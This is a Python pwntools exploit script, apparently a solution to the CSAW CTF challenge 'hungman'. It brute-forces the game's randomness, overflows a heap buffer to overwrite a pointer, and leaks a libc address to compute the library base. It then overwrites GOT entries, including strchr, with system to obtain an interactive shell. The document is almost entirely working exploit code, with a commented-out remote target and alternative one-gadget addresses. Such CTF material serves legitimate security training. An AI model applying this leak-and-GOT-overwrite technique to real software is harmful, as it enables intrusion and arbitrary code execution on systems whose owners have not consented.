#!/usr/bin/env python2

from pwn import *

context.log_level = "DEBUG"
e = ELF("hungman")
#el = ELF("libc-2.23.so")
el = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = process("./hungman")
#r = remote("pwn.chal.csaw.io", 8003)
#r = gdb.debug("./hungman")

r.recvuntil("name?\n")
r.sendline("a") # send one char string to make it easy

# bruteforce randomness until high score
while True:
    r.recvuntil("_\n")
    r.sendline("a")
    res = r.recvline()
    if res != "_\n":
        r.recvuntil("?")
        r.sendline("y")
        continue
    r.sendline("b")
    res = r.recvline()
    if res != "_\n":
        r.recvuntil("?")
        r.sendline("y")
        continue
    r.sendline("c")
    res = r.recvline()
    if res.startswith("Default") == False:
        break
    r.recvuntil("?")
    r.sendline("y")

# need 40 bytes of padding to get to ptr to overwrite, 32 to score
buf = "a" * 32 + p32(10) + p32(26) + p64(0x602020) # just do puts for now
r.sendline("y")
r.sendline(buf)
r.recvuntil("player: ")
snprintf_addr = u64(r.recvn(6) + "\x00\x00")
log.info("Snprintf address: " + hex(snprintf_addr))
libc_base = snprintf_addr - el.symbols["puts"]
log.info("Libc base: " + hex(libc_base))
r.sendline("y")
#magic_addr = libc_base + 0x6f4e6
magic_addr = libc_base + 0xdacf0
#magic_addr = libc_base + el.symbols["system"]
log.info("Magic shell addr: " + hex(magic_addr))

sys_addr = libc_base + el.symbols["system"]
log.info("system at " + hex(sys_addr))
puts_addr = libc_base + el.symbols["puts"]
write_addr = libc_base + el.symbols["write"]
memset_addr = libc_base + el.symbols["memset"]
stack_chk_addr = libc_base + el.symbols["__stack_chk_fail"]
printf_addr = libc_base + el.symbols["printf"]
get_name_addr = 0x400f2d # set strchr to system, set snprintf to get_name
# strchr plt at 0x602038
# snprintf plt at 0x602048
guess = "a"
while True:
    res = r.recvline()
    if "_" in res:
        # make a guess
        r.sendline(guess)
        guess = chr(ord(guess)+1)
    elif res.startswith("High score!"):
        # send our payload
        r.sendline("y")
        #r.sendline(p64(magic_addr))
        payload = p64(puts_addr) + p64(write_addr) + p64(sys_addr) + p64(sys_addr) + p64(printf_addr) + p64(get_name_addr) + p64(memset_addr)
        r.sendline(payload)
        break
'''
#print r.recvall()
r.recvuntil("_\n")
r.sendline("a")
r.recvline()
r.sendline("b")
r.recvline()
r.sendline("c")
r.recvline()
#r.sendline("d")
#r.recvline()
#r.sendline("y")
#r.sendline("aaaa")
'''
#r.sendline("/bin/sh")
r.interactive()
#print r.recvall()
